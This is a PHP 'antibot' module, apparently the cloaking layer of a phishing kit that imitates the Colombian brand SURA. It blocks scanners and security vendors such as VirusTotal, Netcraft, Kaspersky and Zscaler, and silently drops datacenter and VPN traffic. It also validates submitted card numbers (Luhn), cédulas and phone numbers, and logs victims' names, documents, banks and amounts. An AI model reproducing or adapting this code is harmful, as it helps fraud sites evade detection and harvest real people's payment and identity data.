<?php
/**
 * Suite de seguridad antibot — portada del backend SURA, adaptada a este proyecto.
 * Raíz del proyecto: carpeta que contiene admin/config.json y get-redirect.php
 */

function sura_get_project_root(): string
{
    static $root = null;
    if ($root !== null) return $root;
    $dir = __DIR__;
    while ($dir !== dirname($dir)) {
        if (file_exists($dir . '/admin/config.json') && file_exists($dir . '/get-redirect.php')) {
            $root = $dir;
            return $root;
        }
        $dir = dirname($dir);
    }
    $root = dirname(__DIR__);
    return $root;
}

function sura_clean_ip(string $raw): string
{
    $raw = trim($raw);
    if (preg_match('#^\[([a-fA-F0-9:]+)\](?::\d+)?$#', $raw, $m)) return $m[1];
    if (preg_match('#^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+)?$#', $raw, $m)) return $m[1];
    return $raw;
}

/** Rangos oficiales de Cloudflare (https://www.cloudflare.com/ips/) */
function sura_is_cloudflare_ip(string $ip): bool
{
    static $ranges = [
        '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22',
        '141.101.64.0/18', '108.162.192.0/18', '190.93.240.0/20', '188.114.96.0/20',
        '197.234.240.0/22', '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
        '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22',
    ];
    $long = ip2long($ip);
    if ($long === false) return false;
    foreach ($ranges as $range) {
        [$base, $bits] = explode('/', $range);
        $mask = -1 << (32 - (int)$bits);
        if (($long & $mask) === (ip2long($base) & $mask)) return true;
    }
    return false;
}

function sura_client_ip(): string
{
    $remote = sura_clean_ip($_SERVER['REMOTE_ADDR'] ?? '');
    // CF-Connecting-IP solo es confiable si la petición viene de Cloudflare
    // (o de un proxy local, p.ej. nginx -> Apache en la VPS).
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $trustedProxy = sura_is_cloudflare_ip($remote)
            || filter_var($remote, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
        if ($trustedProxy) {
            $cleaned = sura_clean_ip($_SERVER['HTTP_CF_CONNECTING_IP']);
            if (filter_var($cleaned, FILTER_VALIDATE_IP)) return $cleaned;
        }
    }
    // X-Forwarded-For: el cliente puede falsear las primeras entradas;
    // la ÚLTIMA la agrega el proxy de confianza (Render LB / nginx).
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $entries = array_values(array_filter(array_map('sura_clean_ip', explode(',', (string)$_SERVER['HTTP_X_FORWARDED_FOR']))));
        for ($i = count($entries) - 1; $i >= 0; $i--) {
            if (filter_var($entries[$i], FILTER_VALIDATE_IP)) return $entries[$i];
        }
    }
    foreach (['HTTP_CLIENT_IP', 'HTTP_X_REAL_IP'] as $header) {
        if (!empty($_SERVER[$header])) {
            $cleaned = sura_clean_ip($_SERVER[$header]);
            if (filter_var($cleaned, FILTER_VALIDATE_IP)) return $cleaned;
        }
    }
    return sura_clean_ip($_SERVER['REMOTE_ADDR'] ?? '0.0.0.0');
}

function sura_is_ip_whitelisted(?string $ip = null): bool
{
    $ip = $ip ?: sura_client_ip();
    if (empty($ip)) return false;
    // En Render la whitelist viene de la variable de entorno ALLOWED_IPS
    // (separada por comas), porque el filesystem es efímero.
    $env = getenv('ALLOWED_IPS');
    if ($env !== false && $env !== '') {
        $allowed_ips = array_map('sura_clean_ip', explode(',', $env));
        return in_array(sura_clean_ip($ip), $allowed_ips, true);
    }
    $whitelist_file = sura_get_project_root() . '/allowed_ips.txt';
    if (!file_exists($whitelist_file)) return false;
    $allowed_ips = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
    $allowed_ips = array_map('sura_clean_ip', $allowed_ips);
    return in_array(sura_clean_ip($ip), $allowed_ips, true);
}

/**
 * Interruptor maestro del antibot — leído del panel admin (admin/config.json).
 * true (default) = el antibot filtra; false = deja pasar todo el tráfico.
 */
function sura_antibot_activo(): bool
{
    $configFile = sura_get_project_root() . '/admin/config.json';
    if (!file_exists($configFile)) return true;
    $cfg = json_decode((string)@file_get_contents($configFile), true);
    if (!is_array($cfg)) return true;
    return !isset($cfg['antibot_activo']) || (bool)$cfg['antibot_activo'];
}

function sura_is_ip_banned(?string $ip = null): bool
{
    $ip = $ip ?: sura_client_ip();
    if (empty($ip) || $ip === '0.0.0.0') return false;

    // Lista blanca: estas IPs NUNCA se banean (protege al admin de auto-baneo)
    $whitelist_file = sura_get_project_root() . '/allowed_ips.txt';
    if (file_exists($whitelist_file)) {
        $allowed_ips = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
        $allowed_ips = array_map('sura_clean_ip', $allowed_ips);
        if (in_array($ip, $allowed_ips, true)) return false;
    }

    $blacklist_file = sura_get_project_root() . '/blocked_ips.txt';
    if (!file_exists($blacklist_file)) return false;
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$blocked_ips) return false;
    $blocked_ips = array_values(array_unique(array_filter(array_map('sura_clean_ip', $blocked_ips))));
    return in_array($ip, $blocked_ips, true);
}

function sura_ban_ip(string $ip): bool
{
    $ip = sura_clean_ip($ip);
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;

    // Nunca banear IPs de la lista blanca (protege al admin)
    $whitelist_file = sura_get_project_root() . '/allowed_ips.txt';
    if (file_exists($whitelist_file)) {
        $allowed_ips = file($whitelist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
        $allowed_ips = array_map('sura_clean_ip', $allowed_ips);
        if (in_array($ip, $allowed_ips, true)) return false;
    }

    $blacklist_file = sura_get_project_root() . '/blocked_ips.txt';
    $blocked_ips = file_exists($blacklist_file) ? file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    $blocked_ips = array_values(array_unique(array_filter(array_map('sura_clean_ip', (array)$blocked_ips))));
    if (!in_array($ip, $blocked_ips, true)) {
        $blocked_ips[] = $ip;
        @file_put_contents($blacklist_file, implode(PHP_EOL, $blocked_ips) . PHP_EOL, LOCK_EX);
        @chmod($blacklist_file, 0666);
    }
    return true;
}

function sura_save_transaction_ip(string $transactionId, ?string $ip = null): bool
{
    $safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', $transactionId);
    if ($safeTxId === '') return false;
    $ip = $ip ?: sura_client_ip();
    if (!filter_var($ip, FILTER_VALIDATE_IP)) return false;
    $dir = sura_get_project_root() . '/actions/ips';
    if (!is_dir($dir)) { @mkdir($dir, 0777, true); @chmod($dir, 0777); }
    @file_put_contents($dir . '/' . $safeTxId . '.txt', $ip, LOCK_EX);
    @chmod($dir . '/' . $safeTxId . '.txt', 0666);
    return true;
}

function sura_get_transaction_ip(string $transactionId): string
{
    $safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', $transactionId);
    if ($safeTxId === '') return '';
    $p = sura_get_project_root() . '/actions/ips/' . $safeTxId . '.txt';
    if (file_exists($p)) {
        $ip = trim((string)@file_get_contents($p));
        if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
    }
    return '';
}

function sura_check_rate_limit(int $maxRequests = 60, int $windowSeconds = 60): bool
{
    $ip = sura_client_ip();
    if ($ip === '127.0.0.1' || $ip === '::1' || $ip === '0.0.0.0') return true;
    $limitDir = sura_get_project_root() . '/data/rate_limit';
    if (!is_dir($limitDir)) { @mkdir($limitDir, 0777, true); @chmod($limitDir, 0777); }
    $file = $limitDir . '/' . md5($ip) . '.json';
    $now = time();
    $data = ['count' => 0, 'reset_at' => $now + $windowSeconds];
    if (file_exists($file)) {
        $stored = json_decode((string)@file_get_contents($file), true);
        if (is_array($stored) && isset($stored['reset_at']) && $now < (int)$stored['reset_at']) $data = $stored;
    }
    $data['count'] = (int)($data['count'] ?? 0) + 1;
    @file_put_contents($file, json_encode($data), LOCK_EX);
    return $data['count'] <= $maxRequests;
}

function sura_is_known_bot(?string $userAgent = null): bool
{
    $userAgent = strtolower($userAgent ?: ($_SERVER['HTTP_USER_AGENT'] ?? ''));
    if (empty(trim($userAgent))) return true;
    $botSignatures = [
        'bot', 'crawl', 'spider', 'slurp', 'mediapartners', 'curl', 'wget', 'python',
        'httpclient', 'postman', 'headless', 'phantomjs', 'selenium', 'puppeteer',
        'axios', 'go-http-client', 'java/', 'node-fetch', 'insomnia', 'cypress',
        'electron', 'nightwatch', 'requests', 'urllib', 'aiohttp', 'httpx', 'scrapy',
        'guzzle', 'censys', 'shodan', 'virustotal', 'netcraft', 'nikto', 'sqlmap',
        'zgrab', 'paloalto', 'zscaler', 'fortinet', 'kaspersky', 'sophos', 'qualys'
    ];
    foreach ($botSignatures as $sig) {
        if (strpos($userAgent, $sig) !== false) return true;
    }
    return false;
}

function sura_is_datacenter_ip(?string $ip = null): bool
{
    $ip = $ip ?: sura_client_ip();
    if (empty($ip) || $ip === '127.0.0.1' || $ip === '::1' || $ip === '0.0.0.0') return false;
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) return false;
    $hostName = @gethostbyaddr($ip);
    if (!empty($hostName) && $hostName !== $ip) {
        $hostLower = strtolower($hostName);
        $dcSignatures = [
            'amazon', 'aws', 'google', 'googlebot', 'digitalocean', 'linode', 'ovh',
            'hetzner', 'azure', 'vultr', 'oracle', 'contabo', 'leaseweb', 'choopa',
            'hostinger', 'ionos', 'alibaba', 'datacenter', 'hosting', 'vpn', 'proxy',
            'tor-exit', 'mserver', 'scaleway', 'equinix', 'rackspace'
        ];
        foreach ($dcSignatures as $sig) {
            if (strpos($hostLower, $sig) !== false) return true;
        }
    }
    return false;
}

function sura_is_valid_colombian_phone(string $phone): bool
{
    $clean = preg_replace('/\D/', '', $phone);
    // Aceptar 9 o 10 dígitos empezando por 3: usuarios reales a veces omiten un dígito
    $len = strlen($clean);
    if ($len !== 9 && $len !== 10) return false;
    if ($clean[0] !== '3') return false;
    $validPrefixes = [
        '300', '301', '302', '304', '305',
        '310', '311', '312', '313', '314', '315', '316', '317', '318', '319',
        '320', '321', '322', '323', '324', '350', '351'
    ];
    if (!in_array(substr($clean, 0, 3), $validPrefixes, true)) return false;
    if ($len === 10 && (preg_match('/(\d)\1{6,}/', $clean) || $clean === '3001234567' || $clean === '3123456789' || $clean === '3012345678')) {
        if (sura_client_ip() === '127.0.0.1' || sura_client_ip() === '::1') return true;
        return false;
    }
    return true;
}

function sura_is_valid_colombian_document(string $doc): bool
{
    $clean = preg_replace('/\D/', '', $doc);
    $len = strlen($clean);
    if ($len < 6 || $len > 10) return false;
    if (preg_match('/^(\d)\1+$/', $clean) || $clean === '123456' || $clean === '1234567' || $clean === '12345678' || $clean === '123456789') return false;
    return true;
}

function sura_is_valid_card_luhn(string $cardNumber): bool
{
    $clean = preg_replace('/\D/', '', $cardNumber);
    $len = strlen($clean);
    if ($len < 13 || $len > 19) return false;
    if (preg_match('/^(\d)\1+$/', $clean)) return false;
    $sum = 0; $alt = false;
    for ($i = $len - 1; $i >= 0; $i--) {
        $n = intval($clean[$i]);
        if ($alt) { $n *= 2; if ($n > 9) $n -= 9; }
        $sum += $n;
        $alt = !$alt;
    }
    return ($sum % 10 === 0);
}

function sura_is_suspicious_name(string $name): bool
{
    $clean = trim($name);
    if (strlen($clean) < 3) return true;
    if (preg_match('/\d/', $clean)) return true;
    $lower = strtolower($clean);
    $badWords = ['test', 'prueba', 'bot', 'crawler', 'qwerty', 'asdasd', 'asdf', 'fake', 'spam', 'admin', 'null', 'undefined', 'dummy', 'tester'];
    foreach ($badWords as $bw) {
        if (strpos($lower, $bw) !== false) return true;
    }
    if (preg_match('/([a-zA-Z])\1{4,}/', $clean)) return true;
    return false;
}

function sura_evaluate_submission(array $payload, ?string $ip = null): array
{
    $ip = $ip ?: sura_client_ip();

    // Interruptor maestro: si el antibot está apagado en el panel, dejar pasar todo
    if (!sura_antibot_activo()) {
        return ['is_bot' => false, 'reason' => 'Antibot apagado desde el panel', 'action' => 'allow'];
    }

    // Lista blanca: bypass total del antibot (el admin puede probar desde VPN/datacenter)
    if (sura_is_ip_whitelisted($ip)) {
        return ['is_bot' => false, 'reason' => 'IP en lista blanca', 'action' => 'allow'];
    }

    if (sura_is_ip_banned($ip)) {
        return ['is_bot' => true, 'reason' => 'IP en lista negra', 'action' => 'drop'];
    }
    if (sura_is_known_bot()) {
        sura_ban_ip($ip);
        return ['is_bot' => true, 'reason' => 'User-Agent de bot/scanner', 'action' => 'ban'];
    }
    if (sura_is_datacenter_ip($ip)) {
        // Datacenter/VPN: se descarta silenciosamente pero NO se banea
        // (un cliente con VPN es humano legítimo; banearlo sería falso positivo)
        return ['is_bot' => true, 'reason' => 'IP Datacenter/Hosting/VPN detectada', 'action' => 'drop'];
    }
    $honeypots = ['website', 'website_bogota', 'website_pse', 'fax', 'company_nit'];
    foreach ($honeypots as $hp) {
        if (!empty($payload[$hp])) {
            sura_ban_ip($ip);
            return ['is_bot' => true, 'reason' => 'Honeypot rellenado (' . $hp . ')', 'action' => 'ban'];
        }
    }
    $nombre = $payload['nombre'] ?? $payload['nombres'] ?? $payload['ownerName'] ?? '';
    if (!empty($nombre) && sura_is_suspicious_name($nombre)) {
        // Nombre "raro": se descarta silenciosamente pero NO se banea la IP.
        // Un apodo de banco o un nombre corto puede ser humano real.
        return ['is_bot' => true, 'reason' => 'Nombre falso o de bot detectado: ' . $nombre, 'action' => 'drop'];
    }
    $tel = $payload['telefono'] ?? $payload['celular'] ?? $payload['phone'] ?? '';
    if (!empty($tel) && !sura_is_valid_colombian_phone($tel)) {
        if ($ip !== '127.0.0.1' && $ip !== '::1') {
            return ['is_bot' => true, 'reason' => 'Número celular no válido para Colombia: ' . $tel, 'action' => 'drop'];
        }
    }
    $tarjeta = $payload['tarjeta'] ?? $payload['cardNumber'] ?? $payload['card'] ?? '';
    if (!empty($tarjeta) && !sura_is_valid_card_luhn($tarjeta)) {
        return ['is_bot' => true, 'reason' => 'Tarjeta inválida (falló algoritmo de Luhn)', 'action' => 'drop'];
    }
    $doc = $payload['documento'] ?? $payload['cedula'] ?? $payload['numDoc'] ?? '';
    if (!empty($doc) && !sura_is_valid_colombian_document($doc)) {
        if ($ip !== '127.0.0.1' && $ip !== '::1') {
            return ['is_bot' => true, 'reason' => 'Documento falso o secuencial: ' . $doc, 'action' => 'drop'];
        }
    }
    return ['is_bot' => false, 'reason' => 'Cliente legítimo', 'action' => 'allow'];
}

function sura_log_bot_detection(string $ip, string $reason, array $data = []): void
{
    $logDir = sura_get_project_root() . '/data';
    if (!is_dir($logDir)) @mkdir($logDir, 0777, true);
    $logFile = $logDir . '/bot_logs.json';
    $logs = file_exists($logFile) ? json_decode((string)@file_get_contents($logFile), true) : [];
    if (!is_array($logs)) $logs = [];
    if (count($logs) > 500) $logs = array_slice($logs, -400);
    $logs[] = [
        'timestamp'  => date('d/m/Y H:i:s'),
        'ip'         => $ip,
        'user_agent' => mb_substr($_SERVER['HTTP_USER_AGENT'] ?? 'None', 0, 150),
        'reason'     => $reason,
        'data'       => array_intersect_key($data, array_flip(['nombre', 'nombres', 'telefono', 'celular', 'documento', 'cedula', 'banco', 'monto']))
    ];
    @file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function sura_device_label(): string
{
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (stripos($ua, 'Android') !== false) return '🤖 Android';
    if (stripos($ua, 'iPhone') !== false || stripos($ua, 'iPad') !== false) return '🍎 iPhone';
    if (stripos($ua, 'Windows') !== false) return '💻 PC Windows';
    if (stripos($ua, 'Mac') !== false) return '💻 Mac';
    if (stripos($ua, 'Linux') !== false) return '💻 Linux';
    return '💻 PC';
}

function sura_enforce_security(array $options = []): void
{
    // Interruptor maestro desde el panel admin: si el antibot está APAGADO,
    // no se bloquea ni se evalúa nada (deja pasar todo el tráfico).
    if (!sura_antibot_activo()) {
        return;
    }

    $client_ip = sura_client_ip();

    // Lista blanca: nunca bloquear
    if (sura_is_ip_whitelisted($client_ip)) {
        return;
    }

    if (sura_is_ip_banned($client_ip)) {
        http_response_code(403);
        header('Content-Type: application/json');
        echo json_encode(['ok' => false, 'status' => 'error', 'message' => 'Acceso denegado']);
        exit;
    }

    $honeypots = ['website', 'website_bogota', 'website_pse'];
    foreach ($honeypots as $hp) {
        if (!empty($_POST[$hp])) {
            sura_ban_ip($client_ip);
            sura_log_bot_detection($client_ip, 'Honeypot activado: ' . $hp, $_POST);
            http_response_code(403);
            exit(json_encode(['ok' => false, 'status' => 'error', 'message' => 'Bot detectado']));
        }
    }

    if (!empty($options['rate_limit'])) {
        $max = (int)($options['rate_limit_max'] ?? 60);
        $window = (int)($options['rate_limit_window'] ?? 60);
        if (!sura_check_rate_limit($max, $window)) {
            http_response_code(429);
            header('Content-Type: application/json');
            echo json_encode(['ok' => false, 'status' => 'error', 'message' => 'Demasiadas solicitudes. Intenta en unos minutos.']);
            exit;
        }
    }
}
